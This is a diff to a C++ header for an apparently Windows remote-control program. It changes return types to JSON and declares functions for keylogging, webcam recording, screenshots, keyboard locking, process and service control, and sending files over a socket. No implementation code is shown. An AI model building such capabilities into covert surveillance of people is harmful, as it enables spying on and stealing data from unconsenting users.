@@ -28,6 +28,7 @@ extern atomic<bool> isRecording;
 extern thread webcamThread;
 
 const string DATA_FILE = "data.bin";
+const string VIDEO_FILE = "record.mp4";
 
 // start app
 string startApp(string);
@@ -47,7 +48,7 @@ string startService(string);
 string stopService(string);
 
 // list service
-string listService();
+json listService();
 string convertWideCharToString(LPCWSTR wideCharStr);
 string getServiceDescription(SC_HANDLE hService);
 string truncateString(const string& str, size_t maxLength);
@@ -55,7 +56,7 @@ vector<pair<string, tuple<int, string, string>>> listAllServices();
 void writeServiceListToFile(const vector<pair<string, tuple<int, string, string>>>& services);
 
 // list process
-string listProcess();
+json listProcess();
 
 // get file
 bool sendFile(SOCKET&, string);
@@ -69,14 +70,13 @@ string deleteFile(string& filePath);
 // take screenshot
 HBITMAP captureScreen(int& screenWidth, int& screenHeight);
 bool saveScreenshotToFile(HBITMAP hBitmap, int width, int height);
-bool saveBinaryToImage(const string& binaryData, const string& savePath);
-void takeScreenshot();
+bool takeScreenshot();
 
 // keylogger
 map<int, string> createKeyMap();
 vector<string> collectKeyNames(int);
 void writeKeyNamesToFile(vector<string>&);
-string keylogger(int);
+json keylogger(int);
 
 // lock keyboard
 LRESULT CALLBACK processLowLevelKeyboard(int nCode, WPARAM wParam, LPARAM lParam);
@@ -98,9 +98,9 @@ void restart();
 bool isHiddenOrSystem(const filesystem::path&);
 void printDirectoryTree(const filesystem::path&, wofstream&, int, int, int);
 bool listDrivesAndPrintTree();
-string listDirectoryTree();
+json listDirectoryTree();
 
 // webcam
 bool createWebcamVideo(int);
 string turnOnWebcam();
-string turnOffWebcam();
+json turnOffWebcam();
